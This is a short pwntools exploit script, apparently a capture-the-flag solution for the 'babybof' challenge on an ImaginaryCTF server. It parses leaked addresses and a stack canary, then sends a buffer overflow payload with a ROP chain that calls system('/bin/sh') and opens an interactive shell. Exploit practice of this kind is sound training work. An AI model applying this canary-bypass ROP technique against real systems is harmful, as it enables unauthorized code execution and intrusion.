from pwn import *
#p = process("./vuln")
p = remote("babybof.chal.imaginaryctf.org", 1337)
p.recvuntil(b"@ ")
system = int(p.recvline()[2:], 16)
p.recvuntil(b"@ ")
pop_rdi = int(p.recvline()[2:], 16)
p.recvuntil(b"@ ")
ret = int(p.recvline()[2:], 16)
p.recvuntil(b"@ ")
bin_sh = int(p.recvline()[2:], 16)
p.recvuntil(b"canary: ")
canary = int(p.recvline()[2:], 16)

payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendlineafter(b"aligned!): ", payload)
p.interactive()